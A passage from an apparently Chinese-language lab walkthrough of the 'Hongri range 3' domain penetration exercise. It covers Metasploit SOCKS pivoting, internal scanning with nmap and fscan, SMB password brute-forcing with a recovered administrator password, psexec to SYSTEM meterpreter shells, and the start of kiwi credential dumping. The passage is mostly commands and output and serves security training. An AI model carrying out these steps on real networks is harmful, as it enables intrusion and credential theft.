<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_14.png" alt=""  /></p>
<h3 id="搭建socks隧道">搭建socks隧道</h3>
<p>参考之前在红日1里面的笔记<a href="%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f.md###%e6%90%ad%e5%bb%basocks%e9%9a%a7%e9%81%93">红日靶场1-win域</a></p>
<pre tabindex="0"><code>run post/multi/manage/autoroute
background
use auxiliary/server/socks_proxy
run
使用jobs即可查看
msf6 auxiliary(server/socks_proxy) &gt; jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy
</code></pre><h2 id="内网">内网</h2>
<h3 id="内网存活探测">内网存活探测</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains4 nmap -sn -PE 192.168.93.1/24
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains.conf
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/local/lib/libproxychains4.so
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.17
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-08 17:05 CST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.93.1
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0016s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.93.10
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0018s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.93.20
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0033s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.93.30
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0015s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.93.100
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0017s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.93.120
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0050s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">256</span> IP addresses <span style="color:#f92672">(</span><span style="color:#ae81ff">6</span> hosts up<span style="color:#f92672">)</span> scanned in 1.56 seconds
</span></span></code></pre></div><h3 id="内网web机器">内网web机器</h3>
<p>扫一下那台内网web机器,9191端口应该是我刚刚用蚁剑的后渗透插件启动的bind-shell</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains4 nmap -Pn -sT 192.168.93.120 -p22,80,3306,9191 --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains.conf
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/local/lib/libproxychains4.so
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.17
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-08 17:12 CST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.93.120
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.031s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT     STATE  SERVICE
</span></span><span style="display:flex;"><span>22/tcp   open   ssh
</span></span><span style="display:flex;"><span>80/tcp   open   http
</span></span><span style="display:flex;"><span>3306/tcp open   mysql
</span></span><span style="display:flex;"><span>9191/tcp closed sun-as-jpda
</span></span></code></pre></div><p>现在再回到蚁剑的后渗透模块,设置代理,使用bind-shell,传回msf
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_15.png" alt=""  />
linux的两台机器拿到了
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_16.png" alt=""  />
还剩下三台win机器</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.93.10
</span></span><span style="display:flex;"><span>192.168.93.20
</span></span><span style="display:flex;"><span>192.168.93.30
</span></span></code></pre></div><h3 id="信息收集-1">信息收集</h3>
<p>这里我配完proxifier之后,在浏览器里面访问了一下,发现20机器的80端口开放,先扫一下这台</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>复习一下awk,提取nmap的扫描结果中的端口号
</span></span><span style="display:flex;"><span>awk -F <span style="color:#e6db74">&#39;/&#39;</span>  -v ORS<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;,&#39;</span> <span style="color:#e6db74">&#39;{print $1}&#39;</span> aaa | sed <span style="color:#e6db74">&#39;s/,$//&#39;</span>
</span></span></code></pre></div><p>win2008</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains4 nmap -Pn -sT 192.168.93.20 -p80,135,139,445,1433,2383,47001,49152,49153,49154,49155,49156,49158  -A  --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">10000</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains.conf
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.17
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-08 18:56 CST
</span></span><span style="display:flex;"><span>Stats: 0:01:11 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Service Scan
</span></span><span style="display:flex;"><span>Service scan Timing: About 46.15% <span style="color:#66d9ef">done</span>; ETC: 18:59 <span style="color:#f92672">(</span>0:01:22 remaining<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.93.20
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0079s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE      VERSION
</span></span><span style="display:flex;"><span>80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>135/tcp   open  msrpc        Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn?
</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds Windows Server <span style="color:#f92672">(</span>R<span style="color:#f92672">)</span> <span style="color:#ae81ff">2008</span> Datacenter <span style="color:#ae81ff">6003</span> Service Pack <span style="color:#ae81ff">2</span> microsoft-ds
</span></span><span style="display:flex;"><span>1433/tcp  open  ms-sql-s     Microsoft SQL Server <span style="color:#ae81ff">2008</span> 10.00.1600.00; RTM
</span></span><span style="display:flex;"><span>| ms-sql-info:
</span></span><span style="display:flex;"><span>|   192.168.93.20<span style="color:#ae81ff">\M</span>SSQLSERVER:
</span></span><span style="display:flex;"><span>|     Instance name: MSSQLSERVER
</span></span><span style="display:flex;"><span>|     Version:
</span></span><span style="display:flex;"><span>|       name: Microsoft SQL Server <span style="color:#ae81ff">2008</span> RTM
</span></span><span style="display:flex;"><span>|       number: 10.00.1600.00
</span></span><span style="display:flex;"><span>|       Product: Microsoft SQL Server <span style="color:#ae81ff">2008</span>
</span></span><span style="display:flex;"><span>|       Service pack level: RTM
</span></span><span style="display:flex;"><span>|       Post-SP patches applied: false
</span></span><span style="display:flex;"><span>|     TCP port: <span style="color:#ae81ff">1433</span>
</span></span><span style="display:flex;"><span>|_    Clustered: false
</span></span><span style="display:flex;"><span>| ms-sql-ntlm-info:
</span></span><span style="display:flex;"><span>|   192.168.93.20<span style="color:#ae81ff">\M</span>SSQLSERVER:
</span></span><span style="display:flex;"><span>|     Target_Name: TEST
</span></span><span style="display:flex;"><span>|     NetBIOS_Domain_Name: TEST
</span></span><span style="display:flex;"><span>|     NetBIOS_Computer_Name: WIN2008
</span></span><span style="display:flex;"><span>|     DNS_Domain_Name: test.org
</span></span><span style="display:flex;"><span>|     DNS_Computer_Name: win2008.test.org
</span></span><span style="display:flex;"><span>|     DNS_Tree_Name: test.org
</span></span><span style="display:flex;"><span>|_    Product_Version: 6.0.6003
</span></span><span style="display:flex;"><span>|_ssl-date: 2024-10-08T11:00:20+00:00; 0s from scanner time.
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
</span></span><span style="display:flex;"><span>| Not valid before: 2019-12-15T05:29:23
</span></span><span style="display:flex;"><span>|_Not valid after:  2049-12-15T05:29:23
</span></span><span style="display:flex;"><span>2383/tcp  open  ms-olap4?
</span></span><span style="display:flex;"><span>47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span>49152/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49153/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49154/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49155/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49156/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49158/tcp open  msrpc        Microsoft Windows RPC
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :        
</span></span><span style="display:flex;"><span>SF-Port139-TCP:V<span style="color:#f92672">=</span>7.94SVN%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>10/8%Time<span style="color:#f92672">=</span>67050FFA%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>
</span></span><span style="display:flex;"><span>SF:GetRequest,5,<span style="color:#e6db74">&#34;\x83\0\0\x01\x8f&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
</span></span><span style="display:flex;"><span>Device type: general purpose
</span></span><span style="display:flex;"><span>Running: Microsoft Windows XP|7|<span style="color:#ae81ff">2012</span>
</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2012
</span></span><span style="display:flex;"><span>OS details: Microsoft Windows XP SP3 or Windows <span style="color:#ae81ff">7</span> or Windows Server <span style="color:#ae81ff">2012</span>
</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host script results:
</span></span><span style="display:flex;"><span>|_nbstat: NetBIOS name: WIN2008, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:ab:44:ec <span style="color:#f92672">(</span>VMware<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_clock-skew: mean: -1h36m00s, deviation: 3h34m37s, median: -1s
</span></span><span style="display:flex;"><span>| smb-os-discovery:
</span></span><span style="display:flex;"><span>|   OS: Windows Server <span style="color:#f92672">(</span>R<span style="color:#f92672">)</span> <span style="color:#ae81ff">2008</span> Datacenter <span style="color:#ae81ff">6003</span> Service Pack <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#f92672">(</span>R<span style="color:#f92672">)</span> <span style="color:#ae81ff">2008</span> Datacenter 6.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp2
</span></span><span style="display:flex;"><span>|   Computer name: win2008
</span></span><span style="display:flex;"><span>|   NetBIOS computer name: WIN2008<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
</span></span><span style="display:flex;"><span>|   Domain name: test.org
</span></span><span style="display:flex;"><span>|   Forest name: test.org
</span></span><span style="display:flex;"><span>|   FQDN: win2008.test.org
</span></span><span style="display:flex;"><span>|_  System time: 2024-10-08T18:58:24+08:00
</span></span><span style="display:flex;"><span>| smb2-time:
</span></span><span style="display:flex;"><span>|_  start_date: 2019-12-14T11:49:34
</span></span><span style="display:flex;"><span>| smb-security-mode:
</span></span><span style="display:flex;"><span>|   account_used: guest
</span></span><span style="display:flex;"><span>|   authentication_level: user
</span></span><span style="display:flex;"><span>|   challenge_response: supported
</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| smb2-security-mode:
</span></span><span style="display:flex;"><span>|   2:0:2:
</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TRACEROUTE <span style="color:#f92672">(</span>using proto 1/icmp<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>HOP RTT     ADDRESS
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   0.84 ms 192.168.3.2
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>   1.19 ms 192.168.93.20
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 211.63 seconds
</span></span></code></pre></div><p>等其他两个nmap扫描的时候,才发现我忘了上内网神器fscan了&hellip;.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>root@localhost tmp<span style="color:#f92672">]</span><span style="color:#75715e"># ./fscan  -h 192.168.93.10</span>
</span></span><span style="display:flex;"><span>start infoscan
</span></span><span style="display:flex;"><span>192.168.93.10:445 open
</span></span><span style="display:flex;"><span>192.168.93.10:139 open
</span></span><span style="display:flex;"><span>192.168.93.10:135 open
</span></span><span style="display:flex;"><span>192.168.93.10:88 open
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> alive ports len is: <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>start vulscan
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> NetInfo 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>192.168.93.10
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span>-&gt;<span style="color:#f92672">]</span>WIN-8GA56TNV3MV
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span>-&gt;<span style="color:#f92672">]</span>192.168.93.10
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> OsInfo 192.168.93.10        <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2012</span> R2 Datacenter 9600<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> NetBios 192.168.93.10   <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> DC:WIN-8GA56TNV3MV.test.org      Windows Server <span style="color:#ae81ff">2012</span> R2 Datacenter <span style="color:#ae81ff">9600</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>root@localhost tmp<span style="color:#f92672">]</span><span style="color:#75715e"># ./fscan  -h 192.168.93.20</span>
</span></span><span style="display:flex;"><span>start infoscan
</span></span><span style="display:flex;"><span>192.168.93.20:1433 open
</span></span><span style="display:flex;"><span>192.168.93.20:445 open
</span></span><span style="display:flex;"><span>192.168.93.20:139 open
</span></span><span style="display:flex;"><span>192.168.93.20:135 open
</span></span><span style="display:flex;"><span>192.168.93.20:80 open
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> alive ports len is: <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>start vulscan
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> NetInfo
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>192.168.93.20
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span>-&gt;<span style="color:#f92672">]</span>win2008
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span>-&gt;<span style="color:#f92672">]</span>192.168.93.20
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> WebTitle http://192.168.93.20      code:404 len:315    title:Not Found
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> NetBios 192.168.93.20   win2008.test.org                    Windows Server <span style="color:#f92672">(</span>R<span style="color:#f92672">)</span> <span style="color:#ae81ff">2008</span> Datacenter <span style="color:#ae81ff">6003</span> Service Pack <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> OsInfo 192.168.93.20        <span style="color:#f92672">(</span>Windows Server <span style="color:#f92672">(</span>R<span style="color:#f92672">)</span> <span style="color:#ae81ff">2008</span> Datacenter <span style="color:#ae81ff">6003</span> Service Pack 2<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>已完成 5/5
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 扫描结束,耗时: 1.224541199s
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>root@localhost tmp<span style="color:#f92672">]</span><span style="color:#75715e"># ./fscan  -h 192.168.93.30</span>
</span></span><span style="display:flex;"><span>start infoscan
</span></span><span style="display:flex;"><span>192.168.93.30:445 open
</span></span><span style="display:flex;"><span>192.168.93.30:139 open
</span></span><span style="display:flex;"><span>192.168.93.30:135 open
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> alive ports len is: <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>start vulscan
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> NetInfo 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>192.168.93.30
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span>-&gt;<span style="color:#f92672">]</span>win7
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span>-&gt;<span style="color:#f92672">]</span>192.168.93.30
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> OsInfo 192.168.93.30        <span style="color:#f92672">(</span>Windows <span style="color:#ae81ff">7</span> Professional <span style="color:#ae81ff">7601</span> Service Pack 1<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>已完成 3/3
</span></span></code></pre></div><p>另外两台机器最终放弃掉nmap的扫描了,太慢了</p>
<p>总结一下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>test.org域内
</span></span><span style="display:flex;"><span>192.168.93.10 win2012 DC
</span></span><span style="display:flex;"><span>192.168.93.20 win2008 
</span></span><span style="display:flex;"><span>另外有一台机器不在TEST域内
</span></span><span style="display:flex;"><span>192.168.93.30 win7
</span></span></code></pre></div><h3 id="smb凭据爆破">smb凭据爆破</h3>
<p>到这里为止,横向移动的思路卡住了,去看了一下网上的各种解法,最常见的就是爆破smb的凭据了&hellip;.我选的几个字典都没有这个密码,手动添加一下&hellip;..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sed -i <span style="color:#e6db74">&#39;100i 123qwe!ASD&#39;</span> rockyou.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>administrator:123qwe!ASD
</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_17.png" alt=""  />
附上其他师傅的横向思路</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1、mssql要是拿到高权限（sa账号权限）可以尝试通过mssql写 shell 然后提权。
</span></span><span style="display:flex;"><span>2、在进行横向移动时，内网设备扫不出来其他漏洞，只能通过 SMB 爆破或者 NTLM Relay 攻击，SMB 爆破比较碰运气，在实际过程中可以通过收集公司及管理员信息生成对应字典；NTLM Relay 攻击类似社工钓鱼，遇到安全意识不高的管理员才有可能成功，并且在内网环境中安装Python和对应的库也是比较麻烦的，可以考虑使用 conda 等创建虚拟环境，然后一起打包上传到对应靶机，但是相应的环境配置也是比较容易出问题。
</span></span></code></pre></div><h3 id="psexec拿shell">psexec拿shell</h3>
<p>使用msf的windows/smb/psexec模块,拿到20,30机器的shell</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set rhosts 192.168.93.20,30
</span></span><span style="display:flex;"><span>rhosts <span style="color:#f92672">=</span>&gt; 192.168.93.20,30
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/psexec<span style="color:#f92672">)</span> &gt; run
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploiting target 192.168.93.20
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.93.20:445 - Connecting to the server...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.93.20:445 - Authenticating to 192.168.93.20:445 as user <span style="color:#e6db74">&#39;administrator&#39;</span>...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.93.20:445 - Selecting PowerShell target
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.93.20:445 - Executing the payload...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.93.20:445 - Service start timed out, OK <span style="color:#66d9ef">if</span> running a command or non-service executable...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started bind TCP handler against 192.168.93.20:4444
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">201798</span> bytes<span style="color:#f92672">)</span> to 192.168.93.20
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">7</span> opened <span style="color:#f92672">(</span>192.168.3.100:39039 -&gt; 192.168.93.20:4444<span style="color:#f92672">)</span> at 2024-10-08 19:47:02 +0800
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Session <span style="color:#ae81ff">7</span> created in the background.
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploiting target 192.168.93.30
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.93.30:445 - Connecting to the server...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.93.30:445 - Authenticating to 192.168.93.30:445 as user <span style="color:#e6db74">&#39;administrator&#39;</span>...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.93.30:445 - Selecting PowerShell target
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 192.168.93.30:445 - Executing the payload...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.93.30:445 - Service start timed out, OK <span style="color:#66d9ef">if</span> running a command or non-service executable...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started bind TCP handler against 192.168.93.30:4444
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">201798</span> bytes<span style="color:#f92672">)</span> to 192.168.93.30
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">8</span> opened <span style="color:#f92672">(</span>192.168.3.100:42267 -&gt; 192.168.93.30:4444<span style="color:#f92672">)</span> at 2024-10-08 19:47:07 +0800
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Session <span style="color:#ae81ff">8</span> created in the background.
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/psexec<span style="color:#f92672">)</span> &gt; sessions
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Active sessions
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Id  Name  Type                     Information                    Connection
</span></span><span style="display:flex;"><span>  --  ----  ----                     -----------                    ----------
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">7</span>         meterpreter x64/windows  NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM @ WIN2008  192.168.3.100:39039 -&gt; 192.168.93.20:4444 <span style="color:#f92672">(</span>192.168.93.20<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">8</span>         meterpreter x64/windows  NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM @ WIN7     192.168.3.100:42267 -&gt; 192.168.93.30:4444 <span style="color:#f92672">(</span>192.168.93.30<span style="color:#f92672">)</span>
</span></span></code></pre></div><h3 id="kiwi模块获取dc凭据">kiwi模块获取DC凭据</h3>
<p>还剩下一个域控机器,先进入win2008的会话中,加载一下kiwi</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; creds_all
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Running as SYSTEM
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Retrieving all credentials
</span></span><span style="display:flex;"><span>msv credentials
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============</span>
</span></span><span style="display:flex;"><span>
